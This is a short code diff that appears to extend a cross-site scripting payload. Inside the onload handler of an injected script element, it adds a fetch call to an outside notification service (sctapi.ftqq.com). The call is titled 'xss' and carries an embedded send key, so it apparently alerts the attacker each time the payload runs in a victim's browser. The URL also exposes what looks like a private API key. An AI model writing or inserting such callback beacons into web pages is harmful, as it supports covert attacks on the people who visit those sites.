@@ -30,6 +30,18 @@ s1.onload = async function () {
     } catch (error) {
         console.error(error);
     }
+    try {
+        const response = await fetch('https://sctapi.ftqq.com/SCT264973TwyxLsp1rLVuTjZ3jHX2DFGJi.send?title=xss', {
+          method: 'GET'
+        });
+        const result = await response.json();
+        console.log('邮件发送结果:', result);
+        }
+        
+        catch(error){
+          console.error(error)
+      
+        }
 };
 document.body.appendChild(s1);
 
